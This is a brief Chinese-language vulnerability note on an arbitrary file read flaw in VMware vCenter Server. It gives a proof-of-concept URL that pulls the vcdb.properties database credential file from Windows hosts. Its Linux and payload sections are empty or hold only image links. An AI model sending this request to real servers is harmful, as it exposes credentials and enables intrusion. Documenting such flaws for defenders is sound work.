# VMware vCenter Server 任意文件读取漏洞

## 漏洞描述
VMware vCenter Server 特定版本存在任意文件读取漏洞，攻击者通过构造特定的请求，可以读取服务器上任意文件。

## 危害等级
MEDIUM

## 参考链接

## 漏洞复现方法
![image-20220209124210343](images/202202091242446.png)

使用POC访问漏洞点

- Windows主机

```plain
http://xxx.xxx.xxx.xxx/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
```


## Payloads
```
![image-20220209124225730](images/202202091242777.png)

- Linux主机
```
